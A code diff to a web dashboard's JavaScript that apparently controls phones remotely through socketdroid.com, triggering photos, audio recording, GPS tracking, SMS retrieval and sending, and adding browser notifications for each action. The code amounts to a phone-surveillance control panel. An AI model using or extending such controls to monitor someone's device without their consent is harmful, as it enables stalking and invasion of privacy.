@@ -87,7 +87,7 @@ for (var i = 0; i < battery.length; i++) {
 for (var i = 0; i < images.length; i++) {
     images[i].addEventListener('click', function(){
       $.get("https://socketdroid.com/command/camera/" + $(this).data('id'), function(data, status){
-
+        notifyMe("Snapping photo and emailing it to you!");
         }, false);
 
 });
@@ -95,7 +95,7 @@ for (var i = 0; i < images.length; i++) {
 for (var i = 0; i < startAudio.length; i++) {
     startAudio[i].addEventListener('click', function(){
       $.get("https://socketdroid.com/command/audio-start/" + $(this).data('id'), function(data, status){
-
+        notifyMe("Starting audio recording!");
         }, false);
 
 });
@@ -103,14 +103,14 @@ for (var i = 0; i < startAudio.length; i++) {
 for (var i = 0; i < stopAudio.length; i++) {
     stopAudio[i].addEventListener('click', function(){
       $.get("https://socketdroid.com/command/audio-stop/" + $(this).data('id'), function(data, status){
-
+        notifyMe("Stopping audio recording and emailing you results!");
         }, false);
 });
 }
 for (var i = 0; i < getGps.length; i++) {
     getGps[i].addEventListener('click', function(){
       $.get("https://socketdroid.com/command/gps/" + $(this).data('id'), function(data, status){
-
+        notifyMe("Tracking device!");
       }, false);
 });
 }
@@ -118,7 +118,7 @@ for (var i = 0; i < vibrate.length; i++) {
   console.log(vibrate[i]);
     vibrate[i].addEventListener('click', function(){
       $.get("https://socketdroid.com/command/vibrate/" + $(this).data('id'), function(data, status){
-
+        notifyMe("Vibrating device!");
       }, false);
 });
 }
@@ -126,7 +126,7 @@ for (var i = 0; i < texts.length; i++) {
   console.log(vibrate[i]);
     texts[i].addEventListener('click', function(){
       $.get("https://socketdroid.com/command/sms/" + $(this).data('id'), function(data, status){
-
+        notifyMe("Getting SMS and emailing to you!");
       }, false);
 });
 }
@@ -138,7 +138,7 @@ for (var j = 0; j < sendTexts.length; j++) {
       console.log(document.getElementsByClassName("action-send-phone"));
 
       $.post("https://socketdroid.com/sms-send/" + $(this).data('id'),{text:document.getElementsByClassName("action-send-text-text")[j-1].value,phone:document.getElementsByClassName("action-send-phone")[j-1].value}, function(data, status){
-
+        notifyMe("Text is being sent!");
       }, false);
 });
 }
@@ -167,6 +167,31 @@ function initMap(lat,long) {
           });
 
       }
+      function notifyMe(message) {
+  // Let's check if the browser supports notifications
+  if (!("Notification" in window)) {
+    alert("This browser does not support desktop notification");
+  }
+
+  // Let's check whether notification permissions have already been granted
+  else if (Notification.permission === "granted") {
+    // If it's okay let's create a notification
+    var notification = new Notification(message);
+  }
+
+  // Otherwise, we need to ask the user for permission
+  else if (Notification.permission !== 'denied') {
+    Notification.requestPermission(function (permission) {
+      // If the user accepts, let's create a notification
+      if (permission === "granted") {
+        var notification = new Notification(message);
+      }
+    });
+  }
+
+  // At last, if the user has denied notifications, and you
+  // want to be respectful there is no need to bother them any more.
+}
 
 </script>
 <script async defer
